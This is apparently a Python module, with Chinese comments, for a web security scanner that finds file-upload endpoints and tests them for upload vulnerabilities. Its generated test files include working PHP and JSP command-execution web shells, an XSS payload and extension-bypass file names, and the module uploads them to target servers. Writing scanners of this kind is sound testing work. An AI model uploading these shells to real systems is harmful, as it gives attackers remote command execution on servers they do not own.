"""
文件上传漏洞检测模块

本模块实现自动文件上传漏洞检测功能，包括上传接口识别、测试文件生成、上传测试和漏洞判断。
"""

import logging
import os
import re
import tempfile
from typing import Any, Dict, List, Optional

import requests

from ..core.http_client import HttpClient
from ..core.models import APIEndpoint


logger = logging.getLogger(__name__)


class UploadDetector:
    """
    文件上传漏洞检测器
    
    用于识别上传接口、生成测试文件、执行上传测试并分析漏洞。
    
    Attributes:
        http_client: HTTP 客户端实例
        temp_dir: 临时文件目录
        url_keywords: URL 关键词列表
        param_keywords: 参数名关键词列表
    """
    
    URL_KEYWORDS = [
        "upload", "file", "attachment", "document", "media", "image", "photo"
    ]
    
    PARAM_KEYWORDS = [
        "file", "files", "upload", "document", "attachment", "image", "photo", "media"
    ]
    
    SUCCESS_STATUS_CODES = [200, 201, 301, 302]
    
    DANGEROUS_EXTENSIONS = [
        ".php", ".jsp", ".asp", ".aspx", ".exe", ".sh", ".bat", ".cmd", 
        ".pl", ".py", ".cgi", ".war", ".jar"
    ]
    
    def __init__(self, http_client: Optional[HttpClient] = None):
        """
        初始化 UploadDetector
        
        Args:
            http_client: HTTP 客户端实例（可选，不提供则自动创建）
        """
        self.http_client = http_client or HttpClient()
        self.temp_dir = tempfile.mkdtemp(prefix="upload_test_")
        self._test_files: Dict[str, str] = {}
        logger.info(f"UploadDetector 初始化完成，临时目录: {self.temp_dir}")
    
    def detect_upload_endpoint(self, endpoint: APIEndpoint) -> bool:
        """
        识别是否为上传接口
        
        通过以下方式识别上传接口：
        1. URL 包含上传相关关键词
        2. 参数名包含上传相关关键词
        3. Content-Type 为 multipart/form-data
        
        Args:
            endpoint: API 接口对象
            
        Returns:
            是否为上传接口
        """
        logger.info(f"开始识别上传接口: {endpoint.method} {endpoint.path}")
        
        url_lower = endpoint.url.lower()
        for keyword in self.URL_KEYWORDS:
            if keyword in url_lower:
                logger.info(f"URL 包含上传关键词 '{keyword}'，识别为上传接口")
                return True
        
        for param in endpoint.parameters:
            param_name_lower = param.name.lower()
            for keyword in self.PARAM_KEYWORDS:
                if keyword in param_name_lower:
                    logger.info(f"参数名 '{param.name}' 包含上传关键词 '{keyword}'，识别为上传接口")
                    return True
        
        content_type = endpoint.headers.get("Content-Type", "").lower()
        if "multipart/form-data" in content_type:
            logger.info("Content-Type 为 multipart/form-data，识别为上传接口")
            return True
        
        if endpoint.method.upper() == "POST":
            for param in endpoint.parameters:
                if param.param_type == "body" and param.data_type == "file":
                    logger.info("参数类型为文件，识别为上传接口")
                    return True
        
        logger.info("未识别为上传接口")
        return False
    
    def generate_test_files(self) -> Dict[str, str]:
        """
        生成测试文件
        
        生成以下类型的测试文件：
        1. XSS 测试文件（.html）
        2. 普通文本文件（.txt）
        3. 双扩展名文件（test.php.jpg, test.jsp.txt）
        4. 空文件名测试
        
        Returns:
            测试文件路径字典 {文件类型: 文件路径}
        """
        logger.info("开始生成测试文件")
        
        test_files = {}
        
        xss_content = "<script>alert('XSS')</script>"
        xss_file = os.path.join(self.temp_dir, "xss_test.html")
        with open(xss_file, "w", encoding="utf-8") as f:
            f.write(xss_content)
        test_files["xss_html"] = xss_file
        logger.debug(f"生成 XSS 测试文件: {xss_file}")
        
        txt_content = "This is a normal text file for upload testing."
        txt_file = os.path.join(self.temp_dir, "normal_test.txt")
        with open(txt_file, "w", encoding="utf-8") as f:
            f.write(txt_content)
        test_files["normal_txt"] = txt_file
        logger.debug(f"生成普通文本文件: {txt_file}")
        
        php_jpg_content = "<?php phpinfo(); ?>"
        php_jpg_file = os.path.join(self.temp_dir, "test.php.jpg")
        with open(php_jpg_file, "w", encoding="utf-8") as f:
            f.write(php_jpg_content)
        test_files["double_ext_php_jpg"] = php_jpg_file
        logger.debug(f"生成双扩展名文件 (php.jpg): {php_jpg_file}")
        
        jsp_txt_content = "<% out.println(\"test\"); %>"
        jsp_txt_file = os.path.join(self.temp_dir, "test.jsp.txt")
        with open(jsp_txt_file, "w", encoding="utf-8") as f:
            f.write(jsp_txt_content)
        test_files["double_ext_jsp_txt"] = jsp_txt_file
        logger.debug(f"生成双扩展名文件 (jsp.txt): {jsp_txt_file}")
        
        null_byte_content = "null byte injection test"
        null_byte_file = os.path.join(self.temp_dir, "test.php%00.jpg")
        with open(null_byte_file, "w", encoding="utf-8") as f:
            f.write(null_byte_content)
        test_files["null_byte_injection"] = null_byte_file
        logger.debug(f"生成空字节注入测试文件: {null_byte_file}")
        
        php_content = "<?php system($_GET['cmd']); ?>"
        php_file = os.path.join(self.temp_dir, "dangerous.php")
        with open(php_file, "w", encoding="utf-8") as f:
            f.write(php_content)
        test_files["dangerous_php"] = php_file
        logger.debug(f"生成危险 PHP 文件: {php_file}")
        
        jsp_content = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        jsp_file = os.path.join(self.temp_dir, "dangerous.jsp")
        with open(jsp_file, "w", encoding="utf-8") as f:
            f.write(jsp_content)
        test_files["dangerous_jsp"] = jsp_file
        logger.debug(f"生成危险 JSP 文件: {jsp_file}")
        
        self._test_files = test_files
        logger.info(f"测试文件生成完成，共 {len(test_files)} 个文件")
        return test_files
    
    def test_upload(
        self, 
        endpoint: APIEndpoint, 
        file_path: Optional[str] = None,
        field_name: str = "file",
        **kwargs
    ) -> Dict[str, Any]:
        """
        执行上传测试
        
        使用 HttpClient 的 upload_file 方法上传文件，并分析响应结果。
        
        Args:
            endpoint: API 接口对象
            file_path: 要上传的文件路径（可选，不提供则使用测试文件）
            field_name: 表单字段名，默认 "file"
            **kwargs: 额外参数（如额外的表单字段、请求头等）
            
        Returns:
            测试结果字典，包含：
            - success: 是否上传成功
            - vulnerability: 是否存在漏洞
            - file_path: 上传的文件路径
            - response: 响应分析结果
            - error: 错误信息（如果有）
        """
        logger.info(f"开始执行上传测试: {endpoint.url}")
        
        result = {
            "success": False,
            "vulnerability": False,
            "file_path": file_path,
            "response": {},
            "error": ""
        }
        
        if not file_path:
            if not self._test_files:
                self.generate_test_files()
            file_path = self._test_files.get("normal_txt")
            if not file_path:
                result["error"] = "未找到测试文件"
                logger.error(result["error"])
                return result
        
        if not os.path.exists(file_path):
            result["error"] = f"文件不存在: {file_path}"
            logger.error(result["error"])
            return result
        
        try:
            additional_data = kwargs.get("data", {})
            additional_headers = kwargs.get("headers", {})
            
            response = self.http_client.upload_file(
                url=endpoint.url,
                file_path=file_path,
                field_name=field_name,
                data=additional_data,
                headers=additional_headers
            )
            
            response_analysis = self.analyze_response(response)
            result["response"] = response_analysis
            result["success"] = response_analysis.get("upload_success", False)
            
            file_ext = os.path.splitext(file_path)[1].lower()
            if result["success"] and file_ext in self.DANGEROUS_EXTENSIONS:
                result["vulnerability"] = True
                logger.warning(f"检测到漏洞：成功上传危险文件类型 {file_ext}")
            
            if response_analysis.get("file_accessible", False):
                result["vulnerability"] = True
                logger.warning("检测到漏洞：上传的文件可访问")
            
            logger.info(f"上传测试完成 - 成功: {result['success']}, 漏洞: {result['vulnerability']}")
            
        except Exception as e:
            result["error"] = str(e)
            logger.error(f"上传测试失败: {e}")
        
        return result
    
    def analyze_response(self, response: requests.Response) -> Dict[str, Any]:
        """
        分析上传响应
        
        分析响应内容，判断上传是否成功以及是否存在安全问题。
        
        Args:
            response: HTTP 响应对象
            
        Returns:
            分析结果字典，包含：
            - status_code: 状态码
            - upload_success: 是否上传成功
            - file_path: 响应中的文件路径
            - file_url: 响应中的文件 URL
            - file_accessible: 上传的文件是否可访问
            - dangerous_content: 是否包含危险内容
            - response_body: 响应体内容
        """
        logger.info(f"开始分析上传响应，状态码: {response.status_code}")
        
        analysis = {
            "status_code": response.status_code,
            "upload_success": False,
            "file_path": "",
            "file_url": "",
            "file_accessible": False,
            "dangerous_content": False,
            "response_body": response.text[:1000] if response.text else ""
        }
        
        if response.status_code in self.SUCCESS_STATUS_CODES:
            analysis["upload_success"] = True
            logger.debug(f"状态码 {response.status_code} 表示上传成功")
        
        response_text = response.text
        
        path_patterns = [
            r'["\']?path["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']?file_path["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']?filepath["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']?location["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'(?:uploaded|saved|stored)\s+(?:to|at|in)\s+["\']?([^\s"\']+)["\']?',
        ]
        
        for pattern in path_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                analysis["file_path"] = match.group(1)
                logger.debug(f"从响应中提取文件路径: {analysis['file_path']}")
                break
        
        url_patterns = [
            r'["\']?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']?file_url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']?download_url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']?link["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'https?://[^\s"\'<>]+\.(?:php|jsp|asp|aspx|html|txt|jpg|png|gif)',
        ]
        
        for pattern in url_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                analysis["file_url"] = match.group(1)
                logger.debug(f"从响应中提取文件 URL: {analysis['file_url']}")
                break
        
        if analysis["file_url"]:
            try:
                check_response = self.http_client.get(analysis["file_url"], timeout=5)
                if check_response.status_code == 200:
                    analysis["file_accessible"] = True
                    logger.warning(f"上传的文件可访问: {analysis['file_url']}")
                    
                    if any(ext in analysis["file_url"].lower() for ext in self.DANGEROUS_EXTENSIONS):
                        analysis["dangerous_content"] = True
                        logger.warning("上传的文件具有危险扩展名")
            except Exception as e:
                logger.debug(f"无法访问上传的文件: {e}")
        
        if response.status_code in [301, 302]:
            location = response.headers.get("Location", "")
            if location:
                analysis["file_url"] = location
                logger.debug(f"重定向到: {location}")
        
        logger.info(
            f"响应分析完成 - 上传成功: {analysis['upload_success']}, "
            f"文件可访问: {analysis['file_accessible']}"
        )
        
        return analysis
    
    def test_all_scenarios(self, endpoint: APIEndpoint) -> List[Dict[str, Any]]:
        """
        执行所有上传测试场景
        
        使用所有测试文件对目标接口进行测试。
        
        Args:
            endpoint: API 接口对象
            
        Returns:
            所有测试结果的列表
        """
        logger.info(f"开始执行所有上传测试场景: {endpoint.url}")
        
        if not self._test_files:
            self.generate_test_files()
        
        results = []
        
        for test_type, file_path in self._test_files.items():
            logger.info(f"执行测试场景: {test_type}")
            
            result = self.test_upload(endpoint, file_path=file_path)
            result["test_type"] = test_type
            results.append(result)
        
        vulnerability_count = sum(1 for r in results if r.get("vulnerability", False))
        logger.info(
            f"所有测试场景完成 - 总计: {len(results)}, "
            f"发现漏洞: {vulnerability_count}"
        )
        
        return results
    
    def cleanup(self) -> None:
        """
        清理临时文件
        
        删除所有生成的测试文件和临时目录。
        """
        import shutil
        
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
            logger.info(f"临时目录已清理: {self.temp_dir}")
        
        self._test_files.clear()
    
    def __del__(self):
        """析构函数，自动清理临时文件"""
        self.cleanup()
